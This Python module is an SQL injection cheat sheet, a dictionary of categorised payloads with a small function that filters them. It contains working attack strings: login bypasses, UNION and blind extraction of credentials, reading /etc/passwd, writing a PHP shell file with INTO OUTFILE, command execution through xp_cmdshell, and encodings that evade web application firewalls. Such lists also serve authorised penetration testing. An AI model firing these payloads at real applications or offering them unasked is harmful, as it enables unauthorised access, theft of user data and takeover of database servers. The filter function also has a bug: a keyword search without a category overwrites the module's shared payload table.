"""SQL Injection cheat sheet."""

SQLI_CHEATSHEET = {
    "title": "SQL Injection Cheat Sheet",
    "categories": {
        "basic_payloads": {
            "title": "Basic SQLi Payloads",
            "description": "Simple payloads to test for SQL injection",
            "payloads": [
                {"payload": "'", "description": "Single quote - basic test"},
                {"payload": "\"", "description": "Double quote - basic test"},
                {"payload": "' OR '1'='1", "description": "Boolean always true"},
                {"payload": "' OR '1'='1'--", "description": "Boolean true with comment"},
                {"payload": "' OR '1'='1'/*", "description": "Boolean true with block comment"},
                {"payload": "\" OR \"1\"=\"1", "description": "Double quote version"},
                {"payload": "' OR 1=1--", "description": "Numeric comparison"},
                {"payload": "' OR 1=1#", "description": "MySQL comment style"},
                {"payload": "admin'--", "description": "Bypass login as admin"},
                {"payload": "') OR ('1'='1", "description": "Parenthesis variation"},
                {"payload": "1' AND '1'='1", "description": "AND true condition"},
                {"payload": "1' AND '1'='2", "description": "AND false condition"},
            ],
        },

        "union_based": {
            "title": "UNION-Based SQLi",
            "description": "Extract data using UNION SELECT",
            "payloads": [
                {"payload": "' ORDER BY 1--", "description": "Column enumeration"},
                {"payload": "' ORDER BY 10--", "description": "Find column count"},
                {"payload": "' UNION SELECT NULL--", "description": "1 column"},
                {"payload": "' UNION SELECT NULL,NULL--", "description": "2 columns"},
                {"payload": "' UNION SELECT NULL,NULL,NULL--", "description": "3 columns"},
                {"payload": "' UNION SELECT 1,2,3--", "description": "Find visible columns"},
                {"payload": "' UNION SELECT version(),2,3--", "description": "Get version (MySQL)"},
                {"payload": "' UNION SELECT @@version,2,3--", "description": "Get version (MSSQL)"},
                {"payload": "' UNION SELECT user(),database(),3--", "description": "User & DB (MySQL)"},
            ],
        },

        "mysql_specific": {
            "title": "MySQL Specific",
            "description": "MySQL-specific payloads and functions",
            "payloads": [
                {"payload": "SELECT version()", "description": "MySQL version"},
                {"payload": "SELECT user()", "description": "Current user"},
                {"payload": "SELECT database()", "description": "Current database"},
                {"payload": "SELECT @@datadir", "description": "Data directory"},
                {"payload": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()", "description": "List tables"},
                {"payload": "SELECT column_name FROM information_schema.columns WHERE table_name='users'", "description": "List columns"},
                {"payload": "SELECT CONCAT(username,':',password) FROM users", "description": "Extract credentials"},
                {"payload": "SELECT LOAD_FILE('/etc/passwd')", "description": "Read file"},
                {"payload": "SELECT ... INTO OUTFILE '/tmp/shell.php'", "description": "Write file"},
            ],
        },

        "mssql_specific": {
            "title": "MSSQL Specific",
            "description": "Microsoft SQL Server specific payloads",
            "payloads": [
                {"payload": "SELECT @@version", "description": "MSSQL version"},
                {"payload": "SELECT SYSTEM_USER", "description": "Current user"},
                {"payload": "SELECT DB_NAME()", "description": "Current database"},
                {"payload": "SELECT name FROM master..sysdatabases", "description": "List databases"},
                {"payload": "SELECT name FROM sysobjects WHERE xtype='U'", "description": "List tables"},
                {"payload": "; EXEC xp_cmdshell 'whoami'--", "description": "Command execution"},
                {"payload": "; WAITFOR DELAY '0:0:5'--", "description": "Time-based blind"},
            ],
        },

        "oracle_specific": {
            "title": "Oracle Specific",
            "description": "Oracle Database specific payloads",
            "payloads": [
                {"payload": "SELECT banner FROM v$version WHERE rownum=1", "description": "Oracle version"},
                {"payload": "SELECT user FROM dual", "description": "Current user"},
                {"payload": "SELECT table_name FROM all_tables", "description": "List tables"},
                {"payload": "SELECT column_name FROM all_tab_columns WHERE table_name='USERS'", "description": "List columns"},
                {"payload": "' UNION SELECT NULL FROM dual--", "description": "UNION with dual"},
            ],
        },

        "blind_sqli": {
            "title": "Blind SQL Injection",
            "description": "Payloads for blind SQLi (no visible output)",
            "payloads": [
                {"payload": "' AND 1=1--", "description": "Boolean true"},
                {"payload": "' AND 1=2--", "description": "Boolean false"},
                {"payload": "' AND SUBSTRING(version(),1,1)='5'--", "description": "Extract char (MySQL)"},
                {"payload": "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--", "description": "Binary search"},
                {"payload": "' AND (SELECT COUNT(*) FROM users)>0--", "description": "Table exists check"},
            ],
        },

        "time_based": {
            "title": "Time-Based Blind SQLi",
            "description": "Payloads using time delays for blind injection",
            "payloads": [
                {"payload": "' AND SLEEP(5)--", "description": "MySQL sleep"},
                {"payload": "' AND IF(1=1,SLEEP(5),0)--", "description": "MySQL conditional sleep"},
                {"payload": "'; WAITFOR DELAY '0:0:5'--", "description": "MSSQL delay"},
                {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "description": "Oracle delay"},
                {"payload": "'; SELECT PG_SLEEP(5)--", "description": "PostgreSQL sleep"},
                {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "description": "MySQL subquery sleep"},
            ],
        },

        "waf_bypass": {
            "title": "WAF Bypass Techniques",
            "description": "Techniques to bypass Web Application Firewalls",
            "payloads": [
                {"payload": "'/**/OR/**/1=1--", "description": "Comment bypass"},
                {"payload": "' %4fR 1=1--", "description": "URL encoded OR"},
                {"payload": "'%09OR%091=1--", "description": "Tab character"},
                {"payload": "'%0aOR%0a1=1--", "description": "Newline character"},
                {"payload": "' oR '1'='1", "description": "Case variation"},
                {"payload": "' || '1'='1", "description": "OR operator alternative"},
                {"payload": "0x27204f522027313d2731", "description": "Hex encoding"},
                {"payload": "CHAR(39)+CHAR(79)+CHAR(82)+CHAR(39)", "description": "CHAR function"},
            ],
        },

        "login_bypass": {
            "title": "Authentication Bypass",
            "description": "Payloads to bypass login forms",
            "payloads": [
                {"payload": "admin'--", "description": "Login as admin"},
                {"payload": "admin'/*", "description": "Login as admin (block comment)"},
                {"payload": "' OR 1=1--", "description": "Login as first user"},
                {"payload": "' OR 1=1 LIMIT 1--", "description": "Login as first user with limit"},
                {"payload": "admin' OR '1'='1'--", "description": "Admin with always true"},
                {"payload": "' OR ''='", "description": "Empty string comparison"},
                {"payload": "') OR ('1'='1'--", "description": "Parenthesis bypass"},
                {"payload": "' OR 1=1#", "description": "MySQL comment"},
            ],
        },

        "error_based": {
            "title": "Error-Based SQLi",
            "description": "Extract data via error messages",
            "payloads": [
                {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "description": "MySQL extractvalue"},
                {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "description": "MySQL updatexml"},
                {"payload": "' AND 1=CONVERT(int,(SELECT @@version))--", "description": "MSSQL convert error"},
                {"payload": "' AND 1=CAST(version() AS int)--", "description": "PostgreSQL cast error"},
            ],
        },
    },
}


def get_cheatsheet(category: str = None, filter_keyword: str = None) -> dict:
    """
    Get SQL injection cheatsheet.

    Args:
        category: Specific category to return
        filter_keyword: Filter payloads containing keyword

    Returns:
        Cheatsheet dictionary
    """
    if category and category in SQLI_CHEATSHEET["categories"]:
        result = {
            "title": SQLI_CHEATSHEET["title"],
            "categories": {category: SQLI_CHEATSHEET["categories"][category]},
        }
    else:
        result = SQLI_CHEATSHEET

    if filter_keyword:
        filtered_categories = {}
        for cat_name, cat_data in result["categories"].items():
            filtered_payloads = [
                p for p in cat_data["payloads"]
                if filter_keyword.lower() in p["payload"].lower()
                or filter_keyword.lower() in p["description"].lower()
            ]
            if filtered_payloads:
                filtered_categories[cat_name] = {
                    **cat_data,
                    "payloads": filtered_payloads,
                }
        result["categories"] = filtered_categories

    return result
